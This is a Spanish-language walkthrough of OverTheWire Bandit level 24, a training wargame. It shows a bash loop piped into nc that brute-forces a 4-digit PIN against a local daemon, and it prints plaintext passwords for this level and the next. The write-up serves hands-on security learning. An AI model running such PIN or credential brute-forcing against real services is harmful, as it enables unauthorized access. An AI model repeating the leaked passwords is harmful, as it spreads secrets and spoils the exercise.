Level 24 
# Objetivo
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time
# Datos  de Acceso 
ssh bandit24@**bandit.labs.overthewire.org** -p2220

User: bandit24 Pass: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
# Solucion 

```bash
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
^C
bandit24@bandit:~$ echo {0000..0005}
0000 0001 0002 0003 0004 0005
bandit24@bandit:~$ for i in {0000..0005}; do echo 200~VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar~ $i; done
200~VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar~ 0000
200~VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar~ 0001
200~VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar~ 0002
200~VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar~ 0003
200~VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar~ 0004
200~VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar~ 0005
bandit24@bandit:~$ for i in {0000..0005}; do echo 200~VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar~ $i; done | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct current password. Try again.
Wrong! Please enter the correct current password. Try again.
Wrong! Please enter the correct current password. Try again.
Wrong! Please enter the correct current password. Try again.
Wrong! Please enter the correct current password. Try again.
Wrong! Please enter the correct current password. Try again.
Timeout. Exiting.
bandit24@bandit:~$ for i in {0000..9999}; do echo 200~VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar~ $i; done | nc localhost 30002 | grep -v Wrong!
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d


^C
bandit24@bandit:~$

```

# Notas Adicionales
- echo sirve para dadas en su salida estándar, con un espacio en blanco entre cada una y un carácter "salto de línea" después de la última cadena
- nc  permite acceder a puertos TCP o UDP de la propia máquina o de otras máquinas remotas.
- grep nos permite filtrar y eliminar la información inútil que se produce tras ejecutar un comando. 